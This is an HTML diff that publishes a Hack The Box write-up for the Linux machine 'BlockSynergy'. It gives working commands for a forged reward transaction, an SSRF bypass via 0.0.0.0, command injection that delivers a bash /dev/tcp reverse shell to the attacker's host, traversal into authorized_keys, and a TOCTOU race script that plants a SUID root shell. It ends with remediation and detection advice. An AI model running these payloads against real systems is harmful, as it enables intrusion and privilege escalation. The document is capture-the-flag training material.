@@ -3,59 +3,481 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>BlockSynergy — HTB Completion</title>
-  <meta name="description" content="BlockSynergy Hack The Box completion by Lanky. Write-up available after machine retirement.">
+  <title>BlockSynergy — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box: BlockSynergy — Linux. Forged blockchain reward → VIP node access → SSRF via 0.0.0.0 → command injection → smart-contract path traversal → SSH as hank → FTP creds from process args → restore-archive TOCTOU race → SUID root shell.">
   <link rel="stylesheet" href="../assets/style.css?v=5">
-  <link rel="icon" type="image/png" sizes="32x32" href="../assets/favicon-32.png">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#9939;</text></svg>">
 </head>
 <body>
-  <div class="banner">
-    🔒 <strong>Active machine</strong> — technical details are withheld until retirement.
-  </div>
-
   <header class="nav">
     <div class="wrap">
       <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
-      <a class="link" href="../index.html#lab">← Hacking Lab</a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
     </div>
   </header>
 
   <article class="wrap">
-    <a class="back" href="../index.html#lab">back to Hacking Lab</a>
+    <a class="back" href="../index.html#lab">back to writeups</a>
+    <svg class="wu-logo" viewBox="0 0 64 64" role="img" aria-label="BlockSynergy logo">
+      <rect width="64" height="64" rx="8" fill="#11141b"/>
+      <g fill="none" stroke="#22d3ee" stroke-width="2.2" stroke-linejoin="round">
+        <rect x="10" y="12" width="17" height="13" rx="2"/>
+        <rect x="37" y="12" width="17" height="13" rx="2"/>
+        <rect x="23.5" y="39" width="17" height="13" rx="2"/>
+        <path d="M27 18.5h10M18.5 25v8.5h27V25M32 33.5V39"/>
+      </g>
+    </svg>
     <h1 style="margin-top:16px;">BlockSynergy</h1>
-    <div class="subtitle">Hack The Box · completed 2 September 2026</div>
-
+    <div class="subtitle">Hack The Box · completed 2 September 2026 · <a href="https://app.hackthebox.com/machines/BlockSynergy" target="_blank" rel="noopener">app.hackthebox.com/machines/BlockSynergy</a></div>
     <div class="machine-meta">
       <span class="pill os-linux">Linux</span>
-      <span class="pill rooted">● Completed</span>
+      <span class="pill">Blockchain</span>
+      <span class="pill">SSRF</span>
+      <span class="pill">Command injection</span>
+      <span class="pill">TOCTOU race</span>
       <span class="pill flagp">User</span>
       <span class="pill flagp">Root</span>
+      <span class="pill rooted">● Completed</span>
     </div>
 
     <div class="callout">
-      <span class="tag">STATUS</span>
-      Rooted in approximately 1 hour. The complete technical write-up is ready and will be published after BlockSynergy retires.
+      <span class="tag">TL;DR</span>
+      A Linux box that stacks blockchain logic flaws on top of a very ordinary set of web and Unix
+      mistakes: a wallet endpoint that accepted a <strong>forged coinbase reward</strong>, an SSRF
+      blocklist that never heard of <code>0.0.0.0</code>, <strong>command injection</strong> through the
+      userinfo half of a URL, a smart-contract debug hook with <strong>path traversal</strong> into
+      <code>authorized_keys</code>, FTP credentials sitting in root's process arguments, and finally a
+      <strong>TOCTOU race</strong> between <code>sha256sum</code> and <code>tar</code> that turned a
+      backup restore into a SUID root shell.
     </div>
 
-    <h2><span class="num">01</span>What I practised</h2>
-    <ul>
-      <li>Structured web and service enumeration.</li>
-      <li>Chaining multiple weaknesses across application and host boundaries.</li>
-      <li>Linux privilege-escalation analysis.</li>
-      <li>Diagnosing timing-sensitive behaviour and recovering lost access.</li>
-    </ul>
+    <div class="callout todo">
+      <span class="tag">The chain in one line</span>
+      wallet creation → forged blockchain reward → VIP node access → SSRF to the localhost admin panel →
+      command injection → shell as <code>walter</code> → smart-contract path traversal → SSH as
+      <code>hank</code> → exposed FTP credentials → restore-archive TOCTOU race → SUID root shell.
+    </div>
 
-    <h2><span class="num">02</span>Publication note</h2>
+    <dl class="fact">
+      <dt>Target</dt><dd><b>blocksynergy.htb</b></dd>
+      <dt>Host OS</dt><dd>Linux</dd>
+      <dt>Foothold</dt><dd>Forged reward → SSRF (<code>0.0.0.0</code> bypass) → command injection in <code>ping_node</code></dd>
+      <dt>Privesc</dt><dd>Contract-hook path traversal → <code>hank</code> → restore-archive TOCTOU → root</dd>
+      <dt>Time to root</dt><dd>~1 hour, including lost shells and race troubleshooting</dd>
+    </dl>
+
+    <h2><span class="num">01</span>Enumeration</h2>
+    <pre data-lang="bash"><code>echo '&lt;target&gt; blocksynergy.htb' | sudo tee -a /etc/hosts
+nmap -sC -sV -p- -oA blocksynergy &lt;target&gt;</code></pre>
+    <table>
+      <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+      <tr><td>22</td><td>ssh</td><td>OpenSSH</td></tr>
+      <tr><td>8080</td><td>http</td><td>Werkzeug / Flask — blockchain dashboard, wallet and VIP features</td></tr>
+    </table>
+
+    <h2><span class="num">02</span>Wallet creation and VIP access</h2>
+    <p>A wallet is created through <code>/dashboard/wallet</code>, and the response hands back both keys:</p>
+    <pre data-lang="bash"><code>curl -sS -L -c cookies.txt -b cookies.txt \
+  -X POST \
+  -F 'action=create' \
+  -F 'filename=blocksynergy' \
+  http://blocksynergy.htb:8080/dashboard/wallet \
+  -o wallet.json</code></pre>
     <p>
-      To respect Hack The Box rules and avoid spoiling an active machine, commands,
-      credentials, flags, vulnerabilities and the exploitation chain are intentionally withheld.
+      The application then accepts a forged coinbase-style transaction — no mining, no valid signature,
+      just the magic sender name:
+    </p>
+    <pre data-lang="bash"><code>PUB=$(jq -r '.public_key' wallet.json)
+
+jq -n \
+  --arg receiver "$PUB" \
+  --arg timestamp "$(date '+%Y-%m-%d %H:%M:%S.%6N')" \
+  '{
+    sender: "Blockchain_Reward",
+    receiver: $receiver,
+    amount: 100,
+    signature: "Blockchain",
+    timestamp: $timestamp
+  }' &gt; reward.json
+
+curl -sS -c cookies.txt -b cookies.txt \
+  -H 'Content-Type: application/json' \
+  --data @reward.json \
+  http://blocksynergy.htb:8080/broadcast_transaction
+# Added!</code></pre>
+    <p>
+      The resulting balance is enough to unlock the VIP node-management panel.
+    </p>
+    <div class="finding">
+      <span class="tag">Root cause</span>
+      <h4>Reward transactions trusted by name</h4>
+      <p>
+        The transaction endpoint trusted the special <code>Blockchain_Reward</code> sender and every
+        attacker-controlled field alongside it. It never enforced a legitimate mining workflow, and never
+        validated the reward transaction cryptographically.
+      </p>
+    </div>
+
+    <h2><span class="num">03</span>SSRF into the admin panel</h2>
+    <p>
+      The VIP panel lets a user register and test node URLs. Its blocklist rejects the obvious loopback
+      spellings — <code>127.0.0.1</code>, <code>localhost</code>, <code>[::1]</code> — and happily accepts
+      <code>0.0.0.0</code>.
+    </p>
+    <pre data-lang="bash"><code>curl -sS -L -c cookies.txt -b cookies.txt \
+  --data-urlencode 'action=register' \
+  --data-urlencode 'node=http://0.0.0.0:8080/admin/nodes/manage' \
+  http://blocksynergy.htb:8080/dashboard/vip/nodes \
+  -o register.html
+
+curl -sS -b cookies.txt \
+  http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/0</code></pre>
+    <p>
+      Testing the node makes the server request its own localhost-only admin interface. On Linux,
+      <code>0.0.0.0</code> reaches a locally bound service — it is just another spelling of the loopback
+      destination, and an incomplete hostname blocklist never covers all of them.
     </p>
 
-    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to Hacking Lab</a></p>
+    <h2><span class="num">04</span>Command injection in ping_node</h2>
+    <p>
+      The admin node-management page exposes a <code>ping_node</code> action. URL parsing validates the
+      <em>hostname</em>, but the raw <strong>userinfo</strong> portion of the supplied URL is later handed
+      to a shell. So the parser sees <code>0.0.0.0</code> while the shell sees metacharacters:
+    </p>
+    <pre data-lang="text"><code>http://x;&lt;COMMAND&gt;;a@0.0.0.0:8080/</code></pre>
+    <p>
+      A time-based probe confirms blind execution — injecting <code>$(sleep 5)</code> makes the request
+      take about five seconds.
+    </p>
+
+    <h2><span class="num">05</span>Reverse shell as walter</h2>
+    <p>
+      Slashes in the payload fight with URL parsing, so the reverse-shell command is hex-encoded locally
+      and rebuilt with <code>xxd</code> on the target.
+    </p>
+    <pre data-lang="bash"><code>sudo ip link set dev tun0 mtu 1300
+rlwrap nc -lvnp 4444</code></pre>
+    <pre data-lang="bash"><code>LHOST=&lt;tun0-ip&gt;
+LPORT=4444
+
+CMD="bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'"
+HEX=$(printf '%s' "$CMD" | xxd -p -c 999)
+
+INJECT=$(printf '%s' \
+  'http' \
+  '://x;echo${IFS}' \
+  "$HEX" \
+  '|xxd${IFS}-r${IFS}-p|bash;a@0.0.0.0:8080/')
+
+ENC=$(python3 -c \
+  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' \
+  "$INJECT")
+
+TRIGGER=$(printf '%s' \
+  'http' \
+  '://0.0.0.0:8080/admin/nodes/manage?action=ping_node&amp;target=' \
+  "$ENC")</code></pre>
+    <p>Register the node, find its index via <code>/nodes</code>, then trigger it:</p>
+    <pre data-lang="bash"><code>curl -sS -L -c cookies.txt -b cookies.txt \
+  --data-urlencode 'action=register' \
+  --data-urlencode "node=$TRIGGER" \
+  http://blocksynergy.htb:8080/dashboard/vip/nodes \
+  -o shell-node.html
+
+curl -sS http://blocksynergy.htb:8080/nodes -o nodes.json
+
+NODE_ID=$(jq -r --arg u "$TRIGGER" \
+  'to_entries[] | select(.value==$u) | .key' \
+  nodes.json | tail -n1)
+
+curl --max-time 10 -sS -b cookies.txt \
+  "http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/$NODE_ID" \
+  -o /dev/null</code></pre>
+    <pre data-lang="text"><code>uid=1000(walter) gid=1000(walter) groups=1000(walter)</code></pre>
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">06</span>Local enumeration</h2>
+    <p>As <code>walter</code>, the interesting surface is all internal:</p>
+    <table>
+      <tr><th>What</th><th>Detail</th></tr>
+      <tr><td><code>127.0.0.1:5000</code></td><td>Flask smart-contract application, running as <code>hank</code></td></tr>
+      <tr><td><code>127.0.0.1:15432</code></td><td>FTP service in a container</td></tr>
+      <tr><td><code>/opt/blocksynergy</code></td><td>owned <code>hank:developers</code>, group-writable</td></tr>
+      <tr><td><code>/var/restore_work</code></td><td>owned <code>root:developers</code>, mode <code>0775</code></td></tr>
+      <tr><td>root cron</td><td>periodically runs the backup and restore scripts</td></tr>
+    </table>
+    <p>The trust relationships that matter:</p>
+    <ul>
+      <li><code>walter</code> can reach <code>hank</code>'s localhost-only Flask app.</li>
+      <li><code>hank</code> is in the <code>developers</code> group.</li>
+      <li><code>developers</code> can modify entries inside <code>/var/restore_work</code>.</li>
+      <li>root extracts "validated" backup archives out of that same directory.</li>
+    </ul>
+
+    <h2><span class="num">07</span>Smart-contract path traversal → SSH as hank</h2>
+    <p>
+      The Flask app on 5000 has a smart-contract debug hook. The contract's <code>log_file</code> metadata
+      is appended to a fixed logs directory with no traversal sanitising:
+    </p>
+    <pre data-lang="python"><code>logfile = f"/opt/staging/smart_contracts/logs/{log_file}"</code></pre>
+    <p>
+      When the hook fires, attacker-controlled <code>log_content</code> is appended to whatever path that
+      resolves to. Point it at <code>hank</code>'s <code>authorized_keys</code>:
+    </p>
+    <pre data-lang="bash"><code>ssh-keygen -q -t ed25519 -N '' -f /tmp/hankkey
+
+python3 -c '
+import json
+p = open("/tmp/hankkey.pub").read().strip()
+d = {
+    "name": "debug",
+    "owner": "Developer",
+    "logic": {"claim": "allow"},
+    "storage": {},
+    "debug": "True",
+    "hooks": {"on_claim": "log"},
+    "__meta__": {
+        "log_file": "../../../../home/hank/.ssh/authorized_keys",
+        "log_content": {"on_claim": "\n" + p}
+    }
+}
+json.dump(d, open("/tmp/contract.json", "w"))
+'</code></pre>
+    <pre data-lang="bash"><code>curl -sS -c /tmp/hank.cookies -b /tmp/hank.cookies \
+  -F 'action=upload_contract' \
+  -F 'contract_file=@/tmp/contract.json;type=application/json' \
+  http://127.0.0.1:5000/dashboard \
+  -o /tmp/upload.html
+
+curl -sS -c /tmp/hank.cookies -b /tmp/hank.cookies \
+  --data 'action=contract_claim' \
+  http://127.0.0.1:5000/dashboard \
+  -o /tmp/claim.html
+
+ssh -o StrictHostKeyChecking=no -i /tmp/hankkey hank@127.0.0.1</code></pre>
+    <pre data-lang="text"><code>uid=1001(hank) gid=1003(hank) groups=1003(hank),1001(developers)</code></pre>
+
+    <h2><span class="num">08</span>Backup and restore analysis</h2>
+    <p><code>pspy64</code> watches root's processes without needing root:</p>
+    <pre data-lang="bash"><code>/tmp/pspy64 -p -i 10</code></pre>
+    <p>The backup job puts its FTP credentials straight into the command line, where anyone local can read them:</p>
+    <pre data-lang="text"><code>curl -T &lt;archive&gt; ftp://ftpuser:&lt;ftp-password&gt;@127.0.0.1:15432/upload/&lt;archive&gt;</code></pre>
+    <p>The restore daemon runs as root and watches for a marker file. Its workflow:</p>
+    <ol>
+      <li>Download <code>_opt_blocksynergy.tar.gz</code> into <code>/var/restore_work</code>.</li>
+      <li>Calculate its SHA-256.</li>
+      <li>Compare against a trusted manifest.</li>
+      <li>Extract <em>that same pathname</em> into <code>/</code>.</li>
+    </ol>
+    <pre data-lang="bash"><code>curl ftp://ftpuser:&lt;ftp-password&gt;@127.0.0.1:15432/upload/_opt_blocksynergy.tar.gz \
+  -o /var/restore_work/_opt_blocksynergy.tar.gz
+sha256sum /var/restore_work/_opt_blocksynergy.tar.gz
+tar xvf /var/restore_work/_opt_blocksynergy.tar.gz -C /</code></pre>
+    <div class="finding">
+      <span class="tag">Root cause</span>
+      <h4>Verify and extract open the file separately</h4>
+      <p>
+        Checksum verification and extraction each open the archive <em>by pathname</em>. Because
+        <code>hank</code> can rename files inside <code>/var/restore_work</code>, the validated pathname
+        can be replaced after <code>sha256sum</code> has opened it and before <code>tar</code> opens it —
+        a textbook TOCTOU.
+      </p>
+    </div>
+
+    <h2><span class="num">09</span>The malicious restore archive</h2>
+    <pre data-lang="bash"><code>mkdir -p /tmp/evil/opt/blocksynergy
+cp /bin/bash /tmp/evil/opt/blocksynergy/rootshell
+chmod 4755 /tmp/evil/opt/blocksynergy/rootshell
+
+tar --owner=0 --group=0 --numeric-owner \
+  -czf /tmp/evil.tar.gz \
+  -C /tmp/evil opt/blocksynergy/rootshell
+
+tar -tvzf /tmp/evil.tar.gz
+# -rwsr-xr-x 0/0 ... opt/blocksynergy/rootshell</code></pre>
+
+    <h2><span class="num">10</span>Winning the race</h2>
+    <p>
+      <code>inotifywait</code> is not installed, so Python <code>ctypes</code> calls the inotify API
+      directly. The malicious archive is staged as a hidden file <em>in the same directory</em>, so the
+      swap is an atomic rename:
+    </p>
+    <pre data-lang="bash"><code>TARGET=/var/restore_work/_opt_blocksynergy.tar.gz
+READY=/var/restore_work/.evil-ready.tar.gz
+
+cp /tmp/evil.tar.gz "$READY"
+rm -f "$TARGET" /opt/blocksynergy/rootshell</code></pre>
+    <p>
+      The watcher waits for the legitimate FTP download to close the archive, then for the next
+      <code>IN_OPEN</code> — which is <code>sha256sum</code>. That process already holds a descriptor to
+      the legitimate inode, so the pathname can be swapped immediately; root's subsequent <code>tar</code>
+      opens the replacement.
+    </p>
+    <pre data-lang="python"><code>import ctypes
+import os
+import struct
+
+directory = b"/var/restore_work"
+filename = "_opt_blocksynergy.tar.gz"
+ready = "/var/restore_work/.evil-ready.tar.gz"
+target = "/var/restore_work/_opt_blocksynergy.tar.gz"
+
+IN_CLOSE_WRITE = 0x08
+IN_OPEN = 0x20
+
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+fd = libc.inotify_init1(0)
+libc.inotify_add_watch(fd, directory, IN_CLOSE_WRITE | IN_OPEN)
+
+download_finished = False
+print("watcher ready", flush=True)
+
+while True:
+    data = os.read(fd, 4096)
+    offset = 0
+
+    while offset &lt; len(data):
+        wd, mask, cookie, length = struct.unpack_from("iIII", data, offset)
+        offset += 16
+        name = data[offset:offset + length].split(b"\0", 1)[0].decode()
+        offset += length
+
+        if name != filename:
+            continue
+
+        if mask &amp; IN_CLOSE_WRITE:
+            download_finished = True
+            print("download closed", flush=True)
+        elif download_finished and mask &amp; IN_OPEN:
+            os.replace(ready, target)
+            print("archive swapped", flush=True)
+            raise SystemExit</code></pre>
+    <p>With the watcher running, trigger the restore:</p>
+    <pre data-lang="bash"><code>touch /opt/blocksynergy/restore
+# watcher ready
+# download closed
+# archive swapped
+
+ls -l /opt/blocksynergy/rootshell
+# -rwsr-xr-x 1 root root ... /opt/blocksynergy/rootshell
+
+/opt/blocksynergy/rootshell -p
+# uid=1001(hank) euid=0(root) ...</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">11</span>If this were your environment</h2>
+
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>Unvalidated reward transactions and SSRF via an incomplete blocklist</h4>
+      <p>
+        Balance — and with it the VIP feature tier — could be forged by naming the sender
+        <code>Blockchain_Reward</code>. The VIP node feature then fetched attacker-supplied URLs, guarded
+        only by a list of loopback spellings that omitted <code>0.0.0.0</code>.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Validate reward transactions cryptographically</strong> and only mint them through the mining workflow — never from a client-supplied field.</li>
+        <li><strong>Resolve, then check.</strong> Resolve the destination and reject every private, loopback, link-local and CGNAT range, rather than blocklisting hostname strings.</li>
+        <li><strong>Cage the fetcher</strong> in an egress-restricted context so a bypass reaches nothing, and never let a user-facing feature reach an admin-only interface.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · SC-7 boundary protection · AC-4 information-flow enforcement · AC-3 access enforcement<br>
+        <b>OWASP:</b> SSRF Prevention Cheat Sheet — allow-list destinations, block internal ranges
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Command injection through the URL userinfo component</h4>
+      <p>
+        The hostname was validated, but a different part of the same URL — the userinfo — was passed
+        unquoted to a shell. Validating one component and consuming another is the whole bug.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Never build shell strings from user input.</strong> Invoke the binary with an argument vector (<code>subprocess</code> without <code>shell=True</code>), or use a native library instead of shelling out at all.</li>
+        <li><strong>Validate the exact value you later use</strong>, not a neighbouring field parsed out of the same input.</li>
+        <li><strong>Re-serialise after parsing</strong> so anything the parser ignored cannot survive into the next stage.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · CM-7 least functionality · AC-6 least privilege<br>
+        <b>CWE:</b> CWE-78 OS command injection · CWE-20 improper input validation
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · High</span>
+      <h4>Path traversal in contract metadata, and credentials in process arguments</h4>
+      <p>
+        A debug hook wrote attacker-controlled content to an attacker-controlled relative path, which
+        reached <code>~/.ssh/authorized_keys</code>. Separately, root's backup job embedded the FTP
+        password in its command line, where any local user with <code>pspy</code> could read it.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Canonicalise and constrain</strong> every path built from application metadata — resolve it, then assert it is still inside the intended directory. Reject rather than sanitise.</li>
+        <li><strong>Turn debug hooks off outside development</strong>; a "log to a file you choose" feature is an arbitrary-write primitive.</li>
+        <li><strong>Keep secrets out of <code>argv</code>.</strong> Use <code>--netrc</code>, an environment file with restrictive permissions, or a credential helper. <code>/proc</code> is world-readable.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-10 input validation · IA-5 authenticator management · AC-6 least privilege · CM-7 least functionality<br>
+        <b>CWE:</b> CWE-22 path traversal · CWE-214 exposure of sensitive information through process arguments
+      </div>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 4 · Critical</span>
+      <h4>Root extracts archives from a group-writable directory after a separate checksum</h4>
+      <p>
+        The restore job verified an archive and then re-opened it by pathname to extract it as root, from a
+        directory writable by a non-admin group. An atomic rename between the two opens replaced a trusted
+        archive with a SUID-root payload.
+      </p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li><strong>Verify and consume the same file descriptor.</strong> Open once, checksum the descriptor, extract from that descriptor — never re-resolve the path.</li>
+        <li><strong>Do not stage root-consumed files in a directory any unprivileged user can write to.</strong> Restore into a root-only working directory (<code>0700</code>), then move into place.</li>
+        <li><strong>Extract without privilege escalation potential:</strong> strip setuid/setgid bits (<code>tar --no-same-permissions</code>, or extract as an unprivileged user into a staging tree), and refuse archives containing SUID entries.</li>
+        <li><strong>Sign the archives</strong> and verify the signature over the bytes actually extracted, rather than trusting a manifest hash of a pathname.</li>
+      </ul>
+      <div class="ctrl">
+        <b>NIST 800-53 r5:</b> SI-7 software &amp; information integrity · AC-6 least privilege · CM-5 access restrictions for change · AC-3 access enforcement<br>
+        <b>CWE:</b> CWE-367 TOCTOU race condition · CWE-732 incorrect permission assignment
+      </div>
+    </div>
+
+    <h2><span class="num">12</span>Detection — the blue-team side</h2>
+    <ul>
+      <li>Transactions whose sender is a reserved/system name but which arrive over the public broadcast endpoint.</li>
+      <li>Outbound requests from the web application to loopback or RFC1918 addresses — log the declared host <em>and</em> the resolved address.</li>
+      <li>The web application spawning <code>/bin/sh</code> or <code>bash</code> at all; a Flask worker has no reason to.</li>
+      <li>Writes to any <code>authorized_keys</code> outside a provisioning workflow.</li>
+      <li>Renames inside root-consumed staging directories, and SUID files appearing anywhere after an extraction job.</li>
+    </ul>
+
+    <h2><span class="num">13</span>Takeaways</h2>
+    <ul>
+      <li><strong>Blocklists are fragile SSRF controls.</strong> Resolve the destination and check it against every private, loopback and link-local range.</li>
+      <li><strong>Validate the exact value the sensitive code consumes</strong> — not a different field parsed from the same string.</li>
+      <li><strong>Never pass user-controlled URL components to a shell.</strong></li>
+      <li><strong>Paths from application metadata must be canonicalised</strong> and constrained to their intended directory.</li>
+      <li><strong>Credentials in command-line arguments are public</strong> to every local user.</li>
+      <li><strong>Validating a file and reopening it by name later is a race.</strong> Verification and consumption must share a file descriptor.</li>
+      <li><strong>Root must not extract archives from attacker-writable directories</strong> — the archive is only as trustworthy as the directory it sits in.</li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
   </article>
 
-  <footer>
-    <div class="wrap">BlockSynergy · completed · notes by Luke &nbsp;·&nbsp; <a href="../index.html#lab">Hacking Lab</a></div>
-  </footer>
+  <footer><div class="wrap">BlockSynergy · completed · Lanky &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
 </body>
 </html>
